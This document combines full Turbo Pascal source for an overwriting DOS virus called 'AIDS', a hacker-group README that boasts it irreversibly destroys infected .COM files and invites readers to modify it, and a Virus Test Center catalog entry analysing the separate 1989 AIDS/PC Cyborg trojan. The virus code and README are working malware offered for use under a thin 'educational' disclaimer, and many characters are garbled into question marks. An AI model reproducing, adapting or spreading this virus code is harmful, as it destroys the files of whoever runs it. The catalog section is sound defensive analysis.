{ Beginning of source code, Turbo Pascal 3.01a }
{C-}
{U-}
{I-}       { Wont allow a user break, enable IO check }

{ -- Constants --------------------------------------- }

Const
     VirusSize = 13847;    { AIDS?s code size }
     Warning   :String[42]     { Warning message }
     = ?This File Has Been Infected By AIDS! HaHa!?;

{ -- Type declarations------------------------------------- }

Type
     DTARec    =Record      { Data area for file search }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }
   LoopVar      : Integer;  {Will loop forever}

{ -- Program code------------------------------------------ }

Begin
  GetDir(0, UsePath);               { get current directory }
  if Pos(?\?, UsePath) <> UsePathLenght then
    UsePath := UsePath + ?\?;
  UsePath := UsePath + ?*.COM?;        { Define search mask }
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  IF not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);             { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then          { If not IO error then }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
                      { Test if file already ill(Infected) }
        If TestID <> Warning Then        { If not then ... }
        Begin
          Seek (Go, 0);
                            { Mark file as infected and .. }
          MarkInfected := Warning;
                                               { Infect it }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
          Halt;                   {.. and halt the program }
        End;
        Close(Go);
      End;
        { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  ......................Until no more files are found }
    Until Odd(Reg.Flags);
Loopvar:=Random(10);
If Loopvar=7 then
begin
  Writeln(?








?);                          {Give a lot of smiles}
Writeln(??);
Writeln(?     ?);
Writeln(?                                 ATTENTION:
 ?);
Writeln(?      I have been elected to inform you that throughout your process of
 ?);
Writeln(?      collecting and executing files, you have accidentally H??K?     ?
);
Writeln(?      yourself over; again, that??s PHUCKED yourself over. No, it canno
t ?);
Writeln(?      be; YES, it CAN be, a ????s has infected your system. Now what do
 ?);
Writeln(?      you have to say about that? HAHAHAHA. Have H?? with this one and
?);
Writeln(?                       remember, there is NO cure for
 ?);
Writeln(?
 ?);
Writeln(?         ??????????     ????????????    ???????????      ??????????
 ?);
Writeln(?        ????????????     ????????????   ????????????    ????????????
 ?);
Writeln(?        ????      ???        ???        ???       ???   ????       ??
 ?);
Writeln(?        ???       ???        ???        ???       ???   ???
 ?);
Writeln(?        ?????????????        ???        ???       ???   ????????????
 ?);
Writeln(?        ?????????????        ???        ???       ???    ????????????
 ?);
Writeln(?        ???       ???        ???        ???       ???             ???
 ?);
Writeln(?        ???       ???        ???        ???      ????   ??       ????
 ?);
Writeln(?        ???       ???   ????????????    ?????????????    ????????????
 ?);
Writeln(?         ??        ??    ????????????    ???????????      ??????????
 ?);
Writeln(?
 ?);
Writeln(?     ?);
REPEAT
LOOPVAR:=0;
UNTIL LOOPVAR=1;
end;
End.

{ Although this is a primitive virus its effective. }
{ In this virus only the .COM                       }
{ files are infected. Its about 13K and it will     }
{ change the date entry.                            }

 +-------------------------------+     +--------------------------------------+
 |                               |  P  |                                      |
 |  @@@@@@@  @@@@@@@@  @@@@@@@@  |  *  |   #####    #####    ####     #####   |
 |  @@       @@    @@     @@     |  R  |   #   #      #      #   #    #       |
 |  @@       @@    @@     @@     |  *  |   #####      #      #   #    #####   |
 |  @@       @@@@@@@@     @@     |  E  |   #   #      #      #   #        #   |
 |  @@       @@           @@     |  *  |   #   #    #####    ####     #####   |
 |  @@       @@           @@     |  S  |                                      |
 |  @@@@@@@  @@        @@@@@@@@  |  *  +--------------------------------------+
 |                               |  E  |     A NEW AND IMPROVED VIRUS FOR     |
 +-------------------------------+  *  |          PC/MS DOS MACHINES          |
 |       C O R R U P T E D       |  N  +--------------------------------------+
 |                               |  *  |     CREATED BY: DOCTOR DISSECTOR     |
 |     P R O G R A M M I N G     |  T  |FILE INTENDED FOR EDUCATIONAL USE ONLY|
 |                               |  *  |  AUTHOR NOT RESPONSIBLE FOR READERS  |
 |   I N T E R N A T I O N A L   |  S  |DOES NOT ENDORSE ANY ILLEGAL ACTIVITYS|
 +-------------------------------+     +--------------------------------------+

 Well well, here it is... I call it AIDS... It infects all COM files, but it is
 not perfect, so it will also change the date/time stamp to the current system.
 Plus, any READ-ONLY attributes will ward this virus off, it doesn't like them!

 Anyway, this virus was originally named NUMBER ONE, and I modified the code so
 that it would fit my needs. The source code, which is included with this neato
 package was written in Turbo Pascal 3.01a. Yeah I know it's old, but it works.

 Well, I added a few things, you can experiment or mess around with it if you'd
 like to, and add any mods to it that you want, but change the name and give us
 some credit if you do.

 The file is approximately 13k long, and this extra memory will be added to the
 file it picks as host. If no more COM files are to be found, it picks a random
 value from 1-10, and if it happens to be the lucky number 7, AIDS will present
 a nice screen with lots of smiles, with a note telling the operator that their
 system is now screwed, I mean permanantly. The files encrypted containing AIDS
 in their code are IRREVERSIBLY messed up. Oh well...

 Again, neither CPI nor the author of Number One or AIDS endorses this document
 and program for use in any illegal manner. Also, CPI, the author to Number One
 and AIDS is not responsible for any actions by the readers that may prove harm
 in any way or another. This package was written for EDUCATIONAL purposes only!

                    FILES INCLUDED IN THIS *AIDS* PACKAGE:
                    --------------------------------------
        VIRUS.PAS : Source code written in Turbo Pascal 3.01a for AIDS
        VIRUS.COM : Compiled version of AIDS. Execution will cause infection
       README.    : This document you are reading dumb-ass!!!

=== Computer Virus Catalog 1.2: "AIDS" Trojan (10-February-1991) =====
Entry...............: "AIDS" Trojan
Alias(es)...........: PC Cyborg Trojan
Trojan Strain.......: ---
Trojan detected when: December 1989
              where.: USA, Europe
Classification......: Trojan Horse
Carrier of Trojan...: A hidden file named REM<255> of 146188 bytes;
                      (<255> represents the character ASCII(255));
                      distributed with AIDS.EXE as INSTALL.EXE file
                      on AIDS Information Disk of PC Cyborg, Panama
-------------------- Preconditions -----------------------------------
Operating System(s).: MS-DOS, PC-Dos
Version/Release.....: ---
Computer model(s)...: IBM PC, XT, AT and compatibles
-------------------- Attributes --------------------------------------
Easy Identification.: The string "rem<255> PLEASE USE THE auto.bat
                      FILE INSTEAD OF autoexec.bat FOR CONVENIENCE
                      <255>" can be found in AUTOEXEC.BAT
Installation Trigger: Installing the "AIDS Information Diskette" on
                        hard disk drive C.
Storage media affected:Free space on Partition C:, all directories
Interrupts Hooked...: ---
Damage..............: Permanent damage: All directory entry names are
                        encryped by a simple encryption algorithm:
        A -> } , B -> U , C -> _ , D -> @ , E -> 8 , F -> ! , G -> ' ,
        H -> Q , I -> # , J -> D , K -> A , L -> P , M -> C , N -> 1 ,
        O -> R , P -> X , Q -> Z , R -> H , S -> & , T -> 6 , U -> G ,
        V -> 0 , W -> K , X -> V , Y -> N , Z -> I , # -> C , ! -> S ,
        ' -> $ , ^ -> ~ , _ -> 0 , $ -> 3 , 0 -> R , 1 -> F , 2 -> Y ,
        3 -> { , 4 -> J , 5 -> E , 6 -> T , 7 -> ) , 8 -> M , 9 -> - ,
        @ -> L , ~ -> ^ , & -> 7 , } -> 5 , { -> 4 , ) -> % , ( -> B ,
        - -> 2 , % -> W

                         Moreover, 90 extensions known to the program
                         are changed to the following extensions each
                         consisting of one blank plus 2 letters:

 COM -> AK , BAK -> AD , EXE -> AU , PRG -> BR , BAT -> AG , DBF -> AN
 DOC -> AR , WK1 -> CC , DRW -> DI , NDX -> BK , DRV -> CI , BAS -> AF
 OVR -> BN , FNT -> AW , ZBA -> CH , SYS -> BZ , FLB -> DJ , FRM -> AX
 DAT -> AL , LRL -> CJ , OVL -> BM , HLP -> BA , PIC -> DK , XLT -> CF
 MNU -> BI , TXT -> CB , CAL -> CK , FON -> CL , SPL -> CM , PAT -> DL
 MAC -> CN , STY -> BY , VFN -> DM , TST -> CO , GEM -> DN , FIL -> AV
 DEM -> AP , REN -> DO , IMG -> DP , RSC -> DQ , MSG -> BJ , MEM -> DR
 REC -> BX , GLY -> AZ , CMP -> BI , LGO -> CP , DCT -> AO , GRB -> CQ
 CNF -> AJ , INI -> BB , GRA -> CR , DB  -> AM , DTA -> CS , APP -> AC
 CAT -> AH , DIR -> AQ , DVC -> AS , DYN -> AT , INP -> BC , LBR -> BD
 LOC -> BF , MMF -> BH , OUT -> BL , PGG -> BO , PIF -> BP , PRD -> BQ
 PRN -> BS , SCR -> BU , SET -> BV , SK  -> BW , ST  -> BX , TAL -> CA
 WK2 -> CD , WKS -> CE , XQT -> CG , $$$ -> CT , VC  -> CU , TMP -> CV
 PAS -> CW , QBJ -> CX , MAP -> CY , LST -> CZ , LIB -> DA , ASM -> DB
 BLD -> DC , COB -> DD , DIF -> DH , FMT -> DG , MDF -> BG , FOR -> DF

                        The free space on partition C is filled with a
                        file containing a number of strings consisting
                        of blanks followed by CR/LF. Every time the
                        computer boots, a COMMAND.COM is simulated.
                        Almost all commands are requested by an error
                        message. DIR shows the directory before
                        encryption.

Damage..............: Transient damages: from time to time, the fol-
                        lowing message is displayed:

 "It is time to pay for your software lease from PC Cyborg
 Corporation.  Complete the INVOICE and attach payment for the lease
 option of your choice.If you don't use the printed INVOICE, then be
 sure to refer to the important reference numbers below in all
 correspondence.

  In return you will recieve:
    - a renewal software package with easy to follow,
      complete instructions;
    - an automatic, self installing diskette
      that anyone can apply in minutes."

Damage Trigger......: Booting the system 90 times (9 in some cases)
Particularities.....: AIDS.EXE will only run after installation on
                        drive C.
                      Some hidden directories are created containing
                      hidden subdirectories and some files which are
                      used by the trojan; filenames contain blanks and
                      can't be accessed via COMMAND.COM.  AIDS.EXE and
                      INSTALL.EXE have been written in Microsoft Quick
                      Basic 3.0; according to VTCs retroanalysis, the
                      program quality and the encryption method show
                      moderate quality; more- over, the dialog as well
                      as the function to evaluate the personal risk of
                      an AIDS infect- ion, are rather primitive.

-------------------- Acknowledgement --------------------------------

Location............: Virus Test Center,
                      University Hamburg, Germany Classification
                      by...: Ronald Greinke, Uwe Ellermann
Documentation by....: Ronald Greinke
Date................: 10-February-1991
==================== End of AIDS Trojan =============================
